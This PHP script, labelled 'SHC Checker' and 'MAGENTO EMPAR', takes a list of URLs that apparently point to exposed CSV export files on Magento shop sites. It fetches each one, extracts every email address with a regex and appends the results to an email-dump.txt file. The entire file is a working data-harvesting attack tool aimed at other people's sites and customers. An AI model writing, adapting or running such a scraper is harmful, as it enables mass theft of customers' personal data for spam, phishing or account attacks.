<?php
/**
 * @Author: shor7cut
 * @Date:   2017-01-30 14:01:48
 * @Last Modified by:   Eka Syahwan
 * @Last Modified time: 2017-09-13 02:40:09
 */
require_once('shc.modules.php');
$shc = new Modules_Checker;
function result($content, $url, $ch, $email){
	$exp  = explode("/", $email);

	$exxx =  parse_url($email);
	$exxx = "http://".$exxx['host'];

	echo "[MAGENTO EMPAR] ".$exxx." (".substr(str_replace('.csv', '', $exp[5]), 0,5).") => ";
	
	preg_match_all('/[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+/', $content , $cocok);

	if(count($cocok[0]) == 0){
		echo "- kosong [Data : ".strlen($content)."] -";
	}else{
		echo count($cocok[0]);
	}


	$x = fopen("email-dump.txt", "a+");
	foreach ($cocok[0] as $key => $email) {
		fwrite($x, $email."\r\n");
	}
	fclose($x);

	echo "\r\n";
}       
                                                                                   
echo "  _____ _____ _____ _           _            \r\n";  
echo " |   __|  |  |     | |_ ___ ___| |_ ___ ___  SHOR7CUT \r\n"; 
echo " |__   |     |   --|   | -_|  _| '_| -_|  _| \r\n"; 
echo " |_____|__|__|_____|_|_|___|___|_,_|___|_|   \r\n"; 
echo "\r\n";
$file       = $shc->readline("File List Email/Empass : ");
$file       = file_get_contents($file);
$file       = explode("\r\n", $file); // windows (\r\n) linux (\n)
$files      = array_unique($file);
$count      = count($file);

echo "[SHC CHECKER] Tunggu sembentar ...\r\n";
foreach ($files as $number => $site) {

    $shc->startRequest($site, 'result', $site , $custom , false);

}